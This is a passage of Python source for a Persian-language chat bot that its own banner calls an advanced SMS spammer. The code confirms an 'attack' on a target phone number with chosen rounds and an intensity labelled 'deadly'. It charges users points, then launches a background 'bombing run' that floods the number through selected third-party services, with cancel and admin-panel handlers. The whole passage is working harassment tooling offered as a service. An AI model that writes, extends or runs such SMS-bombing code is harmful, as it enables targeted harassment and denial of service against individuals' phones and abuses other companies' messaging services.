        s = user_states[chat_id]
        delay_map = {0.1: "⚡️⚡️ خیلی سریع", 0.05: "🔥🔥 فوق سریع", 0.01: "💀💀 مرگبار"}
        confirmation_text = (
            f"🔔 تایید نهایی عملیات 🔔\n\n"
            f"لطفا اطلاعات زیر را بررسی کرده و در صورت صحت، حمله را تایید کنید:\n\n"
            f"▪️ شماره هدف: `{s['phone']}`\n"
            f"▪️ تعداد دور: {s['rounds']}\n"
            f"▪️ شدت: {delay_map.get(s['delay'], str(s['delay']))}\n"
            f"▪️ تعداد سرویس‌ها: {len(s['selected_services'])}"
        )
        await msg.reply(confirmation_text, chat_keypad=get_confirmation_keypad())
        return

    elif callback_data == "confirm_attack":
        if state != 'awaiting_confirmation': 
            return
        s = user_states[chat_id]
        phone, rounds, delay, services = s['phone'], s['rounds'], s['delay'], s['selected_services']
        
        user_points = get_user_points(chat_id)
        if user_points <= 0:
            await msg.reply("⚠️ شما امتیاز کافی برای انجام عملیات ندارید!", chat_keypad=get_main_menu_keypad())
            return
        
        data = load_data()
        current_points = data["points"].get(str(chat_id), 0)
        if current_points > 0:
            data["points"][str(chat_id)] = current_points - 1
            save_data(data)
            invalidate_cache()
        
        active_services_map = get_active_services()
        selected_services_map = {name: active_services_map[name] for name in services if name in active_services_map}

        if not selected_services_map:
            await msg.reply("❌ هیچ یک از سرویس‌های انتخابی شما در حال حاضر فعال نیست. عملیات لغو شد.", chat_keypad=get_main_menu_keypad())
            return
        
        progress_message = await msg.reply("✅ درخواست شما ثبت شد. در حال آماده‌سازی...", chat_keypad=get_cancel_keypad())
        
        message_id = None
        if hasattr(progress_message, 'message_id'):
            message_id = progress_message.message_id
        elif isinstance(progress_message, dict) and 'message_id' in progress_message:
            message_id = progress_message['message_id']
        else:
            message_id = msg.message_id
        
        stop_event = Event()
        stop_events[chat_id] = stop_event

        Thread(target=bombing_run_with_progress, args=[main_loop, bot_instance, chat_id, message_id, phone, delay, rounds, stop_event, selected_services_map], daemon=True).start()
        user_states[chat_id] = {}
        return

    elif callback_data == "cancel_op":
        if chat_id in stop_events:
            stop_events[chat_id].set()
            await msg.reply("⏳ درخواست لغو ارسال شد. عملیات به زودی متوقف خواهد شد...")
        else:
            await msg.reply("❌ هیچ عملیات فعالی برای لغو وجود ندارد.")
        return

    # ====== دکمه بازگشت ======
    if callback_data == "back_to_admin":
        user_states[chat_id] = {"state": "admin_panel"}
        await msg.reply("👑 به پنل مدیریت بازگشتید.", chat_keypad=get_admin_panel_keypad())
        return

async def main():
    await bot.run()

if __name__ == "__main__":
    os_system('cls' if os_name == 'nt' else 'clear')
    load_data()
    
    print("==========================================")
    print("  ربات اسپمر پیامک پیشرفته در حال اجراست")
    print("  برای توقف CTRL+C را فشار دهید")
    print("==========================================")
    
    try:
        main_loop.run_until_complete(main())
    except KeyboardInterrupt:
        print("\n...ربات متوقف شد")
    except Exception as e:
        print(f"\nخطا: {e}")
